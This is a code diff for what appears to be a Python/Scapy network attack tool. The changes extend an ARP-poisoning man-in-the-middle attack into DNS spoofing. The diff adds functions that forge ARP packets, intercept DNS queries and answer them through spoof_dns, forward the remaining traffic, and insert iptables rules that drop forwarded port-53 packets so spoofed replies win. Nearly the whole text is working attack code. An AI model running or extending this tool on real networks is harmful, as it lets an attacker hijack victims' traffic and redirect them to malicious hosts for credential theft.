@@ -106,13 +106,13 @@ def stop_arp_mitm(thread, group1, group2, stop_event, interface):
 			if (ip1, mac1) != (ip2, mac2):
 				# ARP reply
 				if config.arp_poison_reply:
-					forged_packets.append(forge_arp_reply(ip2, mac1, ip1, mac1))
+					forged_packets.append(forge_arp_reply(ip2, mac2, ip1, mac1))
 					if not config.arp_poison_oneway:
 						forged_packets.append(forge_arp_reply(ip1, mac1, ip2, mac2))
 
 				# ARP request
 				if config.arp_poison_request:
-					forged_packets.append(forge_arp_request(ip2, mac1, ip1, mac1))
+					forged_packets.append(forge_arp_request(ip2, mac2, ip1, mac1))
 					if not config.arp_poison_oneway:
 						forged_packets.append(forge_arp_request(ip1, mac1, ip2, mac2))
 
@@ -121,29 +121,71 @@ def stop_arp_mitm(thread, group1, group2, stop_event, interface):
 	stop_event = threading.Event()
 	# run the poison loop 3 times to restore the valid entries
 	poison_loop(forged_packets, interface, 3, stop_event)
-	
-def only_dns(pkt):
-	return pkt.haslayer(DNS)
 
-def print_fn(pkt, ips, interface):
+# Gets the mac of the given ip by sending an arp broadcast
+# TODO: cache ip and mac pairs for faster mac return (optionally in discovery)
+def get_mac(ip, iface):
+    iface = iface
+	
+    ans, _ = srp(
+        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
+        iface=iface,
+        timeout=2,
+        verbose=False
+    )
+    for _, rcv in ans:
+        return rcv[ARP].hwsrc
+    return None
+
+# Forwards a packet towards the destination by reconstructing its ethernet layer
+def forward_dns_pkt(pkt):
+	dst = pkt[IP].dst
+	iface, _, gw = conf.route.route(dst)
+	next_hop = dst if gw == "0.0.0.0" else gw
+
+	mac = get_mac(next_hop, iface)
+	if mac is None:
+		return
+	
+	eth = Ether(src=get_if_hwaddr(iface), dst=mac)
+	sendp(eth / pkt[IP], iface=iface)
+	
+# Filter for DNS non-replayed DNS packets
+def only_dns_request(pkt, self_mac):
+    return (
+        pkt.haslayer(DNS) and
+		pkt[Ether].src != self_mac
+    )
+
+def print_fn(pkt, interface):
+	if (pkt[DNS].qr == 0):
+		if not spoof_dns(pkt, interface):
+			forward_dns_pkt(pkt)
+	else:
+		forward_dns_pkt(pkt)
 	print(f"src: {pkt[Ether].src}")
 	print(f"summary: {pkt.summary()}")
-	# spoof_dns(pkt, victim_ip, router_ip, interface)
+
+def drop_port_53():
+	run("iptables -I FORWARD -p udp --dport 53 -j DROP")
+	# run("iptables -I FORWARD -p tcp --dport 53 -j DROP")
+
+def allow_port_53():
+    run("iptables -D FORWARD -p udp --dport 53 -j DROP")
+	# run("iptables -D FORWARD -p tcp --dport 53 -j DROP")
 	
 def start_attack(group1, group2, self_ip, self_mac, interface):
 	enable_kernel_forwarding(interface)
 
 	thread, stop_event = start_arp_mitm(group1, group2, self_mac, interface)
-		
-	# Temp: make this function later	
-	# run("iptables -I FORWARD -p udp --dport 53 -j DROP")
-	# run("iptables -I FORWARD -p tcp --dport 53 -j DROP")
-		
-	intercept_pkts(group1, group2, self_mac, interface, only_dns, print_fn)
+	drop_port_53()
+
+	intercept_pkts(self_mac, interface, only_dns_request, print_fn)
 
 	input("\nstop")
 
 	stop_arp_mitm(thread, group1, group2, stop_event, interface)
+	allow_port_53()
 	cleanup_forward(interface)
 
 # placeholder
